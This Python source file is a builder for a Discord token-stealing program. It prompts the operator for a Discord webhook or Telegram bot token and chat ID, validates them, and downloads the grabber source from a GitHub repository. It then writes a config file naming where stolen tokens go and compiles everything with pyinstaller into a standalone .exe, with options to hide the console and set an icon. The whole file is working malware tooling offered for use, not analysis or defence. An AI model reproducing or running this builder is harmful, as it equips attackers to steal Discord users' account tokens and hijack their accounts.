import os
from sys import exit
from colorama import init, Fore as cc
from requests import get, post
from random import choice
from string import ascii_lowercase
import base64
import json
import telegram as py_telegram
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET


def updateFite(filePath,text):
    with open(filePath, 'w') as File:
        File.write(text)

def _input(text):
    print(text, end='');return input()

def folderCheck(folderName):#create folder in this dir if not folder
    if not os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)) + f'\\{folderName}')):
        os.mkdir(os.path.join(os.path.dirname(os.path.abspath(__file__)) + f'\\{folderName}'))
    
def jsonRead(path):
    with open(path, 'r') as File:
        return json.load(File)

def getSourceCode(url = 'https://raw.githubusercontent.com/Sigma-cc/Discord-Token-Grabber/master/token-grabber.py'):
    source = get(url)
    return source.content.decode('utf-8') if source.status_code == 200 else None

clear = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')

banner = f'''
{r} _____           _     _              {m}______       _ _     _           
{r}|  __ \         | |   | |             {m}| ___ \     (_) |   | |          
{r}| |  \/_ __ __ _| |__ | |__   ___ _ __{m}| |_/ /_   _ _| | __| | ___ _ __ 
{r}| | __| '__/ _` | '_ \| '_ \ / _ \ '__{m}| ___ \ | | | | |/ _` |/ _ \ '__|
{r}| |_\ \ | | (_| | |_) | |_) |  __/ |  {m}| |_/ / |_| | | | (_| |  __/ |   
{r} \____/_|  \__,_|_.__/|_.__/ \___|_|  {m}\____/ \__,_|_|_|\__,_|\___|_|   
            {y}Made by: {g}https://github.com/Sigma-cc
'''

while True:
    clear()

    folderCheck('build')
    name = _input(f'{banner}\n{y}[>]Enter a grabber name (result .exe will be saved with this name) =>{g}')
    if name == '' or name == ' ': name = ''.join([choice(list(ascii_lowercase)) for i in range(7)])
    discord = _input(f'{y}[>]Send tokens to discord? ({g}y{y}/{r}n{y}) =>{g}').lower()
    if discord == 'y':
        while True:
            webhook = _input(f'{y}[>]Enter discord webhook, for send tokens to discord (q - exit) =>{g}')
            if webhook.lower() == 'q':
                webhook = False
                break
            result = post(webhook, json={'content' : ''.join([choice(list(ascii_lowercase)) for i in range(7)])})
            if result.status_code == 200 or result.status_code == 204:
                print(f'{g}[+]Successful, webhook worker')
                break
            else:
                print(f'{r}[-]Problem, webhook returned {result.status_code}.')
        while type(webhook) == str:
            style_discord = _input(f'{y}[>]Choice result style\n    {b}[1] - https://prnt.sc/wndsmv {r}(slower)\n    {b}[2] - https://prnt.sc/wndt5l\n{y}====>{g}').lower()
            if style_discord == '1':
                style_discord = False;break
            elif style_discord == '2':
                style_discord = True;break
    else:
        discord = webhook = style_discord = False
        
    telegram = _input(f'{y}[>]Send tokens to telegram? ({g}y{y}/{r}n{y}) =>{g}').lower()
    if telegram == 'y':
        while True:
            token = _input(f'{y}[>]Enter telegram bot token [t.me/BotFather](q - exit) =>{g}')
            if token.lower() == 'q':
                token = False
                break
            request = py_telegram.utils.request.Request(read_timeout=10)
            try:
                bot = py_telegram.Bot(token, request=request)
                print(f'{g}[+]Successful, token valid')
                break
            except py_telegram.error.InvalidToken:
                print(f'{r}[-]Problem, invalid bot token')
        while type(token) == str:
            chat_id = _input(f'{y}[>]Enter your telegram id [t.me/getmyid_bot] =>{g}')
            try:
                bot.send_message(chat_id=chat_id, text='Hello it`s test message for check.', parse_mode='html')
                print(f'{g}[+]Successful, correct id.')
                break
            except py_telegram.error.BadRequest:
                print(f'{r}[-]Problem, chat not found.\n{y}[!]If you are sure that you have entered the correct id, then make sure that you send /start command to the bot.')
        while type(token) == str:
            style_telegram = _input(f'{y}[>]Choice result style\n    {b}[1] - https://prnt.sc/wnedxf {r}(slower)\n    {b}[2] - https://prnt.sc/wnee5l\n{y}====>{g}').lower()
            if style_telegram == '1':
                style_telegram = False;break
            elif style_telegram == '2':
                style_telegram = True;break
    else:
        token = chat_id = style_telegram = telegram = False
    
    hide = _input(f'{y}[>]Hide Grabber console? [{g}recommended{y}]({g}y{y}/{r}n{y})\n  {b}[1] - Hide\n  {b}[2] - No Hide\n{y}====>{g}').lower()
    hide = '--noconsole' if hide == '1' else ''
    icon = _input(f'{y}[>]Set icon for program?({g}y{y}/{r}n{y}) {y}=>{g}').lower()
    if icon == 'y':
        icon = '--icon="' + _input(f'{y}Iput icon path =>{g}') + '"'

    else:
        icon = ''
    

    if discord or telegram:
        config_settings = f'''
WEBHOOK_URL = """{webhook}"""
WEBHOOK_STYLE = {style_discord}

TELEGRAM_STYLE = {style_telegram}
TELEGRAM_BOT_TOKEN = """{token}"""
TELEGRAM_USER_ID = """{chat_id}"""'''
        folderCheck('build')
        folderCheck('temp')
        updateFite(f'temp/{name}.py', getSourceCode())
        updateFite(f'temp/config.py', config_settings)

        print(f'Build...')
        os.system(f'pyinstaller {icon} --onefile ./temp/{name}.py --name {name} --distpath ./build  --log-level ERROR {hide}')
        _input(f'{w}Build End... Press Enter For Return...')


